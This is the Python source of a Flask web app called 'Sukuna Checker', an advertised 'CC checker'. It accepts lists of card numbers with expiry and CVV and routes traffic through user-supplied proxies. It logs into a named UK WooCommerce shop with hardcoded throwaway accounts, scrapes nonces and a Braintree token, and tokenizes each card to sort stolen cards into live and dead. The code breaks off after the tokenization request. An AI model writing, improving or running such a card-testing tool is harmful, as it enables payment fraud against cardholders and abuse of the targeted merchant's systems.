
from flask import Flask, render_template_string, request, jsonify, send_file, session
import threading
import time
import re
import random
import string
import jwt
import base64
import os
import json
import uuid
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.hmac import HMAC
import requests
from datetime import datetime
import csv
from io import StringIO, BytesIO
from concurrent.futures import ThreadPoolExecutor, as_completed

app = Flask(__name__)
app.secret_key = 'sukuna_checker_secret_key_2023'

# HTML Template
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sukuna Checker</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary-color: #00ff41;
            --secondary-color: #00a32a;
            --bg-color: #0a0a0a;
            --card-bg: #1a1a1a;
            --text-color: #ffffff;
            --border-color: #333333;
            --success-color: #00ff41;
            --danger-color: #ff4141;
            --warning-color: #ffaa00;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background-color: var(--bg-color);
            color: var(--text-color);
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            background-image: 
                linear-gradient(rgba(0, 255, 65, 0.03) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 255, 65, 0.03) 1px, transparent 1px);
            background-size: 20px 20px;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
            padding: 30px;
            border: 2px solid var(--primary-color);
            border-radius: 15px;
            background: linear-gradient(135deg, rgba(0, 255, 65, 0.1) 0%, rgba(0, 163, 42, 0.1) 100%);
            box-shadow: 0 0 30px rgba(0, 255, 65, 0.3);
            position: relative;
            overflow: hidden;
        }
        
        .header::before {
            content: '';
            position: absolute;
            top: -2px;
            left: -2px;
            right: -2px;
            bottom: -2px;
            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color), var(--primary-color));
            border-radius: 15px;
            opacity: 0.5;
            z-index: -1;
            animation: glow 3s ease-in-out infinite alternate;
        }
        
        @keyframes glow {
            from { opacity: 0.3; }
            to { opacity: 0.7; }
        }
        
        .header h1 {
            color: var(--primary-color);
            font-size: 3rem;
            margin-bottom: 10px;
            text-shadow: 0 0 20px var(--primary-color);
            letter-spacing: 3px;
            font-weight: bold;
        }
        
        .header p {
            color: var(--primary-color);
            font-size: 1.3rem;
            letter-spacing: 2px;
        }
        
        .card {
            background-color: var(--card-bg);
            border: 1px solid var(--border-color);
            border-radius: 15px;
            margin-bottom: 25px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }
        
        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 12px 40px rgba(0, 255, 65, 0.2);
        }
        
        .card-header {
            background: linear-gradient(135deg, rgba(0, 255, 65, 0.2) 0%, rgba(0, 163, 42, 0.2) 100%);
            border-bottom: 2px solid var(--primary-color);
            padding: 20px;
            border-radius: 15px 15px 0 0;
        }
        
        .card-header h3 {
            color: var(--primary-color);
            margin: 0;
            font-size: 1.5rem;
            font-weight: bold;
            letter-spacing: 1px;
        }
        
        .required {
            color: var(--danger-color);
        }
        
        .form-control, .form-select {
            background-color: rgba(0, 0, 0, 0.6);
            border: 1px solid var(--primary-color);
            color: var(--text-color);
            border-radius: 8px;
            padding: 12px;
            font-family: 'Courier New', monospace;
            transition: all 0.3s ease;
        }
        
        .form-control:focus, .form-select:focus {
            background-color: rgba(0, 0, 0, 0.8);
            border-color: var(--primary-color);
            box-shadow: 0 0 10px rgba(0, 255, 65, 0.5);
            color: var(--text-color);
        }
        
        .btn-custom {
            background: linear-gradient(135deg, var(--primary-color) 0%, var(--secondary-color) 100%);
            color: var(--bg-color);
            border: none;
            padding: 12px 30px;
            border-radius: 8px;
            font-weight: bold;
            letter-spacing: 1px;
            transition: all 0.3s ease;
            text-transform: uppercase;
            margin: 5px;
            min-width: 150px;
        }
        
        .btn-custom:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(0, 255, 65, 0.5);
            color: var(--bg-color);
        }
        
        .btn-danger-custom {
            background: linear-gradient(135deg, var(--danger-color) 0%, #cc0000 100%);
        }
        
        .btn-warning-custom {
            background: linear-gradient(135deg, var(--warning-color) 0%, #ff8800 100%);
        }
        
        .stats-box {
            background: linear-gradient(135deg, rgba(0, 255, 65, 0.1) 0%, rgba(0, 163, 42, 0.1) 100%);
            border: 1px solid var(--primary-color);
            border-radius: 10px;
            padding: 20px;
            text-align: center;
            margin-bottom: 20px;
        }
        
        .stat-item {
            margin: 10px 0;
        }
        
        .stat-label {
            color: var(--primary-color);
            font-size: 0.9rem;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .stat-value {
            color: var(--text-color);
            font-size: 2rem;
            font-weight: bold;
            text-shadow: 0 0 10px currentColor;
        }
        
        .result-item {
            background-color: rgba(0, 0, 0, 0.3);
            border: 1px solid var(--border-color);
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 15px;
            transition: all 0.3s ease;
        }
        
        .result-item:hover {
            background-color: rgba(0, 0, 0, 0.5);
            transform: translateX(5px);
        }
        
        .result-approved {
            border-left: 4px solid var(--success-color);
        }
        
        .result-declined {
            border-left: 4px solid var(--danger-color);
        }
        
        .result-error {
            border-left: 4px solid var(--warning-color);
        }
        
        .proxy-live {
            border-left: 4px solid var(--success-color);
        }
        
        .proxy-dead {
            border-left: 4px solid var(--danger-color);
        }
        
        .status-badge {
            padding: 5px 15px;
            border-radius: 20px;
            font-weight: bold;
            text-transform: uppercase;
            font-size: 0.8rem;
            letter-spacing: 1px;
        }
        
        .status-approved {
            background-color: var(--success-color);
            color: var(--bg-color);
        }
        
        .status-declined {
            background-color: var(--danger-color);
            color: var(--text-color);
        }
        
        .status-error {
            background-color: var(--warning-color);
            color: var(--bg-color);
        }
        
        .status-live {
            background-color: var(--success-color);
            color: var(--bg-color);
        }
        
        .status-dead {
            background-color: var(--danger-color);
            color: var(--text-color);
        }
        
        .loading-spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(0, 255, 65, 0.3);
            border-top: 3px solid var(--primary-color);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-left: 10px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .terminal-effect {
            font-family: 'Courier New', monospace;
            position: relative;
            color: var(--primary-color) !important;
            font-weight: bold;
            font-size: 1.1rem;
        }
        
        .terminal-effect::before {
            content: '>';
            color: var(--primary-color);
            margin-right: 10px;
        }
        
        .scroll-container {
            max-height: 400px;
            overflow-y: auto;
            padding-right: 10px;
            scroll-behavior: smooth;
        }
        
        .scroll-container::-webkit-scrollbar {
            width: 8px;
        }
        
        .scroll-container::-webkit-scrollbar-track {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px;
        }
        
        .scroll-container::-webkit-scrollbar-thumb {
            background: var(--primary-color);
            border-radius: 10px;
        }
        
        .scroll-container::-webkit-scrollbar-thumb:hover {
            background: var(--secondary-color);
        }
        
        .pulse {
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.7; }
            100% { opacity: 1; }
        }
        
        .completion-notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: linear-gradient(135deg, rgba(0, 255, 65, 0.9) 0%, rgba(0, 163, 42, 0.9) 100%);
            color: var(--bg-color);
            padding: 15px 25px;
            border-radius: 10px;
            font-weight: bold;
            z-index: 1000;
            display: none;
            animation: slideIn 0.5s ease;
            box-shadow: 0 5px 20px rgba(0, 255, 65, 0.5);
        }
        
        @keyframes slideIn {
            from {
                transform: translateX(100%);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }
        
        .result-message {
            color: #cccccc;
            font-size: 0.9rem;
            margin-top: 5px;
            word-break: break-word;
        }
        
        .result-time {
            color: #888888;
            font-size: 0.8rem;
        }
        
        .access-modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
        }
        
        .access-modal-content {
            background-color: var(--card-bg);
            margin: 15% auto;
            padding: 30px;
            border: 2px solid var(--primary-color);
            border-radius: 15px;
            width: 400px;
            text-align: center;
            box-shadow: 0 0 30px rgba(0, 255, 65, 0.3);
        }
        
        .access-modal h3 {
            color: var(--primary-color);
            margin-bottom: 20px;
        }
        
        .alert-custom {
            padding: 15px;
            margin-bottom: 20px;
            border: 1px solid var(--danger-color);
            border-radius: 8px;
            background-color: rgba(255, 65, 65, 0.1);
            color: var(--danger-color);
            display: none;
        }
        
        /* Responsive adjustments */
        @media (max-width: 768px) {
            .header h1 {
                font-size: 2rem;
            }
            
            .btn-custom {
                padding: 10px 20px;
                min-width: 120px;
                font-size: 0.9rem;
            }
            
            .stats-box {
                padding: 15px;
            }
            
            .stat-value {
                font-size: 1.5rem;
            }
        }
    </style>
</head>
<body>
    <div class="completion-notification" id="completionNotification">
        <i class="fas fa-check-circle"></i> Checking Completed! Downloading results...
    </div>
    
    <div class="alert-custom" id="alertMessage">
        <i class="fas fa-exclamation-triangle"></i> <span id="alertText"></span>
    </div>
    
    <div class="access-modal" id="accessModal">
        <div class="access-modal-content">
            <h3><i class="fas fa-key"></i> Access Required</h3>
            <p>Please enter your access key to continue:</p>
            <input type="password" class="form-control mb-3" id="accessKey" placeholder="Enter access key">
            <button class="btn btn-custom" onclick="verifyAccess()">Verify</button>
        </div>
    </div>
    
    <div class="container" id="mainContent" style="display: none;">
        <div class="header">
            <h1><i class="fas fa-skull"></i> Sukuna Checker</h1>
            <p>ADVANCED CC CHECKER</p>
        </div>
        
        <div class="row">
            <div class="col-lg-8">
                <div class="card">
                    <div class="card-header">
                        <h3><i class="fas fa-credit-card"></i> CARDS (format: card|mm|yy|cvv)</h3>
                    </div>
                    <div class="card-body">
                        <textarea class="form-control" id="cardInput" rows="10" placeholder="4147202567804222|11|27|145&#10;4147098351051305|08|29|355&#10;4254181810060270|09|27|451&#10;5518277088577273|11|28|912&#10;4737020029233509|06|27|952&#10;5518277003423835|11|28|989&#10;5518277014542003|11|28|041&#10;5518277080270513|11|28|942&#10;4288240069423173|08|28|782&#10;5518277074373737|11|28|020"></textarea>
                    </div>
                </div>
                
                <div class="card">
                    <div class="card-header">
                        <h3><i class="fas fa-server"></i> PROXIES <span class="required">(Required)</span> (format: username:password@domain:port)</h3>
                    </div>
                    <div class="card-body">
                        <textarea class="form-control" id="proxyInput" rows="5" placeholder="username:password@proxy1.example.com:8080&#10;username:password@proxy2.example.com:8080&#10;username:password@proxy3.example.com:8080" required></textarea>
                        <div class="mt-2">
                            <button class="btn btn-custom" id="checkProxyBtn" onclick="checkProxies()">
                                <i class="fas fa-shield-alt"></i> Check Proxies
                            </button>
                            <div class="loading-spinner" id="proxyLoadingSpinner"></div>
                        </div>
                    </div>
                </div>
                
                <div class="card">
                    <div class="card-header">
                        <h3><i class="fas fa-server"></i> Payment Gateway</h3>
                    </div>
                    <div class="card-body">
                        <select class="form-select" id="gatewaySelect">
                            <option value="braintree" selected>Braintree Auth</option>
                        </select>
                    </div>
                </div>
                
                <div class="text-center">
                    <button class="btn btn-custom" id="startBtn" onclick="startChecking()">
                        <i class="fas fa-play"></i> Start Checking
                    </button>
                    <button class="btn btn-custom btn-danger-custom" id="stopBtn" onclick="stopChecking()" disabled>
                        <i class="fas fa-stop"></i> Stop
                    </button>
                    <button class="btn btn-custom btn-warning-custom" onclick="clearResults()">
                        <i class="fas fa-trash"></i> Clear
                    </button>
                    <div class="loading-spinner" id="loadingSpinner"></div>
                </div>
            </div>
            
            <div class="col-lg-4">
                <div class="card">
                    <div class="card-header">
                        <h3><i class="fas fa-chart-line"></i> LIVE STATISTICS</h3>
                    </div>
                    <div class="card-body">
                        <div class="stats-box">
                            <div class="stat-item">
                                <div class="stat-label">Total</div>
                                <div class="stat-value" id="totalStat">0</div>
                            </div>
                            <div class="stat-item">
                                <div class="stat-label">Live</div>
                                <div class="stat-value" id="liveStat" style="color: var(--success-color);">0</div>
                            </div>
                            <div class="stat-item">
                                <div class="stat-label">Dead</div>
                                <div class="stat-value" id="deadStat" style="color: var(--danger-color);">0</div>
                            </div>
                            <div class="stat-item">
                                <div class="stat-label">Success Rate</div>
                                <div class="stat-value" id="successStat">0%</div>
                            </div>
                            <div class="stat-item">
                                <div class="stat-label">Avg Time</div>
                                <div class="stat-value" id="avgTimeStat">0s</div>
                            </div>
                        </div>
                        
                        <div class="text-center">
                            <button class="btn btn-custom" onclick="exportResults('approved')">
                                <i class="fas fa-download"></i> Export Approved
                            </button>
                            <button class="btn btn-custom btn-danger-custom" onclick="exportResults('dead')">
                                <i class="fas fa-download"></i> Export Dead
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="card">
            <div class="card-header">
                <h3><i class="fas fa-list"></i> CHECKING RESULTS</h3>
            </div>
            <div class="card-body">
                <div class="scroll-container" id="resultsContainer">
                    <p class="text-center text-muted">No results yet. Start checking to see results here.</p>
                </div>
            </div>
        </div>
    </div>
    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        let checking = false;
        let updateInterval;
        let totalCards = 0;
        let hasShownCompletion = false;
        const ACCESS_KEY = '@BaignX';
        
        // Check access on page load
        window.onload = function() {
            if (sessionStorage.getItem('accessVerified') !== 'true') {
                document.getElementById('accessModal').style.display = 'block';
            } else {
                document.getElementById('mainContent').style.display = 'block';
            }
        };
        
        function verifyAccess() {
            const key = document.getElementById('accessKey').value;
            if (key === ACCESS_KEY) {
                sessionStorage.setItem('accessVerified', 'true');
                document.getElementById('accessModal').style.display = 'none';
                document.getElementById('mainContent').style.display = 'block';
            } else {
                showAlert('Invalid access key. Please try again.');
                document.getElementById('accessKey').value = '';
            }
        }
        
        function showAlert(message) {
            const alertElement = document.getElementById('alertMessage');
            const alertText = document.getElementById('alertText');
            alertText.textContent = message;
            alertElement.style.display = 'block';
            
            setTimeout(() => {
                alertElement.style.display = 'none';
            }, 5000);
        }
        
        function checkProxies() {
            const proxies = document.getElementById('proxyInput').value.trim();
            
            if (!proxies) {
                showAlert('Please enter proxies to check');
                return;
            }
            
            document.getElementById('checkProxyBtn').disabled = true;
            document.getElementById('proxyLoadingSpinner').style.display = 'inline-block';
            
            fetch('/check_proxies', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'proxies=' + encodeURIComponent(proxies)
            })
            .then(response => response.json())
            .then(data => {
                document.getElementById('checkProxyBtn').disabled = false;
                document.getElementById('proxyLoadingSpinner').style.display = 'none';
                
                if (data.status === 'success') {
                    updateProxyResults(data.results);
                    showAlert(`Proxy check completed: ${data.live_count} live, ${data.dead_count} dead`);
                } else {
                    showAlert('Error checking proxies');
                }
            })
            .catch(error => {
                document.getElementById('checkProxyBtn').disabled = false;
                document.getElementById('proxyLoadingSpinner').style.display = 'none';
                showAlert('Error checking proxies');
            });
        }
        
        function updateProxyResults(proxyResults) {
            const container = document.getElementById('resultsContainer');
            
            let html = '';
            proxyResults.forEach(result => {
                const statusClass = result.status === 'LIVE' ? 'proxy-live' : 'proxy-dead';
                const badgeClass = result.status === 'LIVE' ? 'status-live' : 'status-dead';
                
                html += `
                    <div class="result-item ${statusClass}">
                        <div class="d-flex justify-content-between align-items-start">
                            <div class="flex-grow-1">
                                <div class="terminal-effect mb-2">${result.proxy}</div>
                                <div class="result-message">${result.message}</div>
                            </div>
                            <div class="text-end">
                                <span class="status-badge ${badgeClass}">${result.status}</span>
                                <div class="result-time">${result.time}s</div>
                            </div>
                        </div>
                    </div>
                `;
            });
            
            container.innerHTML = html;
        }
        
        function startChecking() {
            const cards = document.getElementById('cardInput').value.trim();
            const proxies = document.getElementById('proxyInput').value.trim();
            
            if (!cards) {
                showAlert('Please enter cards to check');
                return;
            }
            
            if (!proxies) {
                showAlert('Please enter proxies. Proxies are required for checking.');
                return;
            }
            
            totalCards = cards.split('\\n').filter(line => line.trim()).length;
            hasShownCompletion = false;
            
            checking = true;
            document.getElementById('startBtn').disabled = true;
            document.getElementById('stopBtn').disabled = false;
            document.getElementById('loadingSpinner').style.display = 'inline-block';
            
            fetch('/start', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'cards=' + encodeURIComponent(cards) + '&proxies=' + encodeURIComponent(proxies)
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === 'already_running') {
                    showAlert('Checking is already running');
                } else if (data.status === 'no_proxies') {
                    showAlert('Please enter proxies. Proxies are required for checking.');
                    stopChecking();
                }
            });
            
            // Start updating status
            updateInterval = setInterval(updateStatus, 1000);
        }
        
        function stopChecking() {
            checking = false;
            document.getElementById('startBtn').disabled = false;
            document.getElementById('stopBtn').disabled = true;
            document.getElementById('loadingSpinner').style.display = 'none';
            
            fetch('/stop', {
                method: 'POST'
            });
            
            clearInterval(updateInterval);
        }
        
        function clearResults() {
            fetch('/clear', {
                method: 'POST'
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === 'cleared') {
                    document.getElementById('resultsContainer').innerHTML = '<p class="text-center text-muted">No results yet. Start checking to see results here.</p>';
                    updateStats({
                        total: 0,
                        live: 0,
                        dead: 0,
                        success_rate: 0,
                        avg_time: 0
                    });
                }
            });
        }
        
        function updateStatus() {
            fetch('/status')
            .then(response => response.json())
            .then(data => {
                updateStats(data.stats);
                updateResults(data.results);
                
                // Check if checking is complete
                if (!data.checking && checking && !hasShownCompletion) {
                    if (data.stats.total >= totalCards) {
                        checkingComplete();
                    }
                }
            });
        }
        
        function checkingComplete() {
            hasShownCompletion = true;
            stopChecking();
            
            // Show completion notification
            const notification = document.getElementById('completionNotification');
            notification.style.display = 'block';
            
            // Auto-download both files
            setTimeout(() => {
                exportResults('approved', true);
                setTimeout(() => {
                    exportResults('dead', true);
                }, 500);
            }, 1000);
            
            // Hide notification after 5 seconds
            setTimeout(() => {
                notification.style.display = 'none';
            }, 5000);
        }
        
        function updateStats(stats) {
            document.getElementById('totalStat').textContent = stats.total;
            document.getElementById('liveStat').textContent = stats.live;
            document.getElementById('deadStat').textContent = stats.dead;
            document.getElementById('successStat').textContent = stats.success_rate + '%';
            document.getElementById('avgTimeStat').textContent = stats.avg_time + 's';
        }
        
        function updateResults(results) {
            const container = document.getElementById('resultsContainer');
            
            if (results.length === 0) {
                container.innerHTML = '<p class="text-center text-muted">No results yet. Start checking to see results here.</p>';
                return;
            }
            
            let html = '';
            results.forEach(result => {
                const statusClass = result.status.toLowerCase() === 'approved' ? 'approved' : 
                                   result.status.toLowerCase() === 'declined' ? 'declined' : 'error';
                const badgeClass = result.status.toLowerCase() === 'approved' ? 'status-approved' : 
                                  result.status.toLowerCase() === 'declined' ? 'status-declined' : 'status-error';
                
                html += `
                    <div class="result-item result-${statusClass}">
                        <div class="d-flex justify-content-between align-items-start">
                            <div class="flex-grow-1">
                                <div class="terminal-effect mb-2">${result.card}</div>
                                <div class="result-message">${result.message}</div>
                            </div>
                            <div class="text-end">
                                <span class="status-badge ${badgeClass}">${result.status}</span>
                                <div class="result-time">${result.time}s</div>
                            </div>
                        </div>
                    </div>
                `;
            });
            
            container.innerHTML = html;
            
            // Auto-scroll to bottom only if user is at the bottom
            const isScrolledToBottom = container.scrollHeight - container.clientHeight <= container.scrollTop + 50;
            if (isScrolledToBottom) {
                setTimeout(() => {
                    container.scrollTop = container.scrollHeight;
                }, 100);
            }
        }
        
        function exportResults(type, silent = false) {
            // Check if there are any results
            fetch('/status')
            .then(response => response.json())
            .then(data => {
                let filteredResults;
                if (type === 'approved') {
                    filteredResults = data.results.filter(r => r.status === 'APPROVED');
                } else {
                    filteredResults = data.results.filter(r => r.status === 'DECLINED' || r.status === 'ERROR');
                }
                
                if (filteredResults.length === 0) {
                    showAlert(`No ${type} cards to download`);
                    return;
                }
                
                if (silent) {
                    // Create hidden iframe for silent download
                    const iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    iframe.src = `/export/${type}`;
                    document.body.appendChild(iframe);
                    setTimeout(() => {
                        document.body.removeChild(iframe);
                    }, 1000);
                } else {
                    window.open(`/export/${type}`, '_blank');
                }
            });
        }
        
        // Prevent automatic scrolling when user is manually scrolling
        let isUserScrolling = false;
        const scrollContainer = document.getElementById('resultsContainer');
        
        scrollContainer.addEventListener('scroll', () => {
            isUserScrolling = true;
            clearTimeout(window.scrollEndTimer);
            window.scrollEndTimer = setTimeout(() => {
                isUserScrolling = false;
            }, 100);
        });
    </script>
</body>
</html>
"""

# Global variables for managing the checking process
checking = False
threads = []
results = []
proxy_results = []
live_proxies = []
stats = {
    "total": 0,
    "live": 0,
    "dead": 0,
    "success_rate": 0,
    "avg_time": 0
}
approved_keywords = [
    "invalid postal code",
    "invalid street address",
    "insufficient funds",
    "nice! new payment method added",
    "status code 81724: duplicate card exists in the vault",
    "issuer declined",
    "cvv"
]

EMAIL_LIST = [
    "homisa7484@lawior.com",
    "filace6558@kudimi.com",
    "bonaf20102@lawior.com",
    "gojok72592@lawior.com",
    "yasah75426@kudimi.com",
    "wekoc48613@lawior.com",
    "keral76460@kudimi.com",
    "bokay32330@kudimi.com",
    "vadis42017@lawior.com",
    "heroj65058@lawior.com"
]

def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"
        
def random_secret():
    return os.urandom(32)

def make_jwt():
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {
        "jti": str(uuid.uuid4()),
        "iat": int(time.time()),
        "exp": int(time.time()) + 7200,
        "iss": uuid.uuid4().hex[:16],
        "OrgUnitId": uuid.uuid4().hex[:24],
    }

    secret = random_secret()

    token = jwt.encode(
        payload,
        secret,
        algorithm="HS256",
        headers=header
    )

    return token

def generate_user_agent():
    return 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'

def generate_random_account():
    return random.choice(EMAIL_LIST)

def generate_username():
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=20))
    return f"{name}{number}"

def generate_random_code(length=32):
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for _ in range(length))

def check_proxy(proxy):
    start_time = time.time()
    
    try:
        # Parse proxy string
        if '@' in proxy:
            auth_part, addr_part = proxy.split('@', 1)
            if ':' in auth_part:
                username, password = auth_part.split(':', 1)
            else:
                username = auth_part
                password = ''
            
            if ':' in addr_part:
                host, port = addr_part.split(':', 1)
            else:
                host = addr_part
                port = '8080'
        else:
            # No authentication provided
            username = ''
            password = ''
            if ':' in proxy:
                host, port = proxy.split(':', 1)
            else:
                host = proxy
                port = '8080'
        
        # Create proxy dictionary for requests
        if username and password:
            proxy_dict = {
                'http': f'http://{username}:{password}@{host}:{port}',
                'https': f'http://{username}:{password}@{host}:{port}'
            }
        else:
            proxy_dict = {
                'http': f'http://{host}:{port}',
                'https': f'http://{host}:{port}'
            }
        
        # Test proxy by making a request to a fast API
        test_url = 'http://httpbin.org/ip'
        response = requests.get(
            test_url,
            proxies=proxy_dict,
            timeout=5  # Reduced timeout for faster checking
        )
        
        if response.status_code == 200:
            processing_time = round(time.time() - start_time, 2)
            return {
                "proxy": proxy,
                "status": "LIVE",
                "message": f"Proxy is working. IP: {response.json().get('origin', 'Unknown')}",
                "time": processing_time,
                "proxy_dict": proxy_dict
            }
        else:
            processing_time = round(time.time() - start_time, 2)
            return {
                "proxy": proxy,
                "status": "DEAD",
                "message": f"Proxy returned status code: {response.status_code}",
                "time": processing_time,
                "proxy_dict": None
            }
    
    except Exception as e:
        processing_time = round(time.time() - start_time, 2)
        return {
            "proxy": proxy,
            "status": "DEAD",
            "message": f"Error: {str(e)}",
            "time": processing_time,
            "proxy_dict": None
        }

def check_card(card_data, proxy_dict=None):
    global stats, results
    
    card_number, exp_month, exp_year, cvv = card_data.split('|')
    start_time = time.time()
    
    user = generate_user_agent()
    acc = generate_random_account()
    username = generate_username()
    corr = generate_random_code()
    sess = generate_random_code()
    r = requests.session()
    
    # Set proxy if provided
    if proxy_dict:
        r.proxies.update(proxy_dict)
    
    try:
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Referer': 'https://arrows-uk.com/my-account/add-payment-method/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': user,
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        }

        r1 = r.get('https://arrows-uk.com/my-account/add-payment-method/', headers=headers, timeout=30)
        nonce_match = re.search(r'id="woocommerce-login-nonce".*?value="(.*?)"', r1.text)
        if not nonce_match:
            raise Exception("Could not find login nonce")
        nonce = nonce_match.group(1)

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://arrows-uk.com',
            'Referer': 'https://arrows-uk.com/my-account/add-payment-method/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': user,
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        }

        data = {
            'username': acc,
            'password': 'God@111983',
            'rememberme': 'forever',
            'woocommerce-login-nonce': nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'login': 'Log in',
            'ct_bot_detector_event_token': 'f683b7fbb380e9d05396c26f37711acd6854975e9c5595c0a8a42055110a5426',
        }

        r2 = r.post('https://arrows-uk.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data, timeout=30)

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Referer': 'https://arrows-uk.com/my-account/add-payment-method/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': user,
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        }

        r3 = r.get('https://arrows-uk.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, timeout=30)
        noncec_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', r3.text)
        if not noncec_match:
            raise Exception("Could not find payment method nonce")
        noncec = noncec_match.group(1)
        
        token_match = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', r3.text)
        if not token_match:
            raise Exception("Could not find Braintree client token")
        token = token_match.group(1)
        token = json.loads(base64.b64decode(token))['authorizationFingerprint']

        headers = {
            'authority': 'payments.braintree-api.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': f'Bearer {token}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': user,
        }

        json_data = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": str(uuid.uuid4())
            },
            "query": """mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { 
                tokenizeCreditCard(input: $input) { 
                    token 
                    creditCard { 
                        bin 
                        brandCode 
                        last4 
                        cardholderName 
                        expirationMonth 
                        expirationYear 
                        binData { 
                            prepaid 
                            healthcare 
                            debit 
                            durbinRegulated 
                            commercial 
                            payroll 
                            issuingBank 
                            countryOfIssuance 
                            productId 
                            business 
                            consumer 
                            purchase 
                            corporate 
                        } 
                    } 
                } 
            }""",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": card_number,
                        "expirationMonth": exp_month,
                        "expirationYear": exp_year,
                        "cvv": cvv,
                        "billingAddress": {
                            "postalCode": "10080",
                            "streetAddress": "Street 8886"
                        }
                    },
                    "options": {
                        "validate": False
                    }
                }
            },
            "operationName": "TokenizeCreditCard"
        }

        r4 = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, timeout=30)
